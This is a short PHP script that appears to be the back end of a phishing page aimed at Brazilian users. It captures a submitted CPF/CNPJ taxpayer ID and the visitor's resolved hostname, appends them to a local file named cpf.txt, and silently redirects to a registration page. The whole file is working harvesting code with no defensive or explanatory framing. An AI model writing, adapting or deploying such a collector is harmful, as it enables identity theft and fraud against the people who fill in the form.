<?
$caixa1= "CPF: " .$_POST["cpf_cnpj"]. "\n";
$caixa2= "-------------P1-------------" .$_POST[""]. "\n";
$caixa3= gethostbyaddr($_SERVER['REMOTE_ADDR']);
$caixa4= "" .$_POST[""]. "\n...............................\n";


$file = fopen("cpf.txt", "a");


$escrever1 = fwrite($file, $caixa1);
$escrever2 = fwrite($file, $caixa2);
$escrever3 = fwrite($file, $caixa3);
$escrever4 = fwrite($file, $caixa4);


fclose($file);


?>
<meta http-equiv="refresh"content="0;url=cadastrar.html">
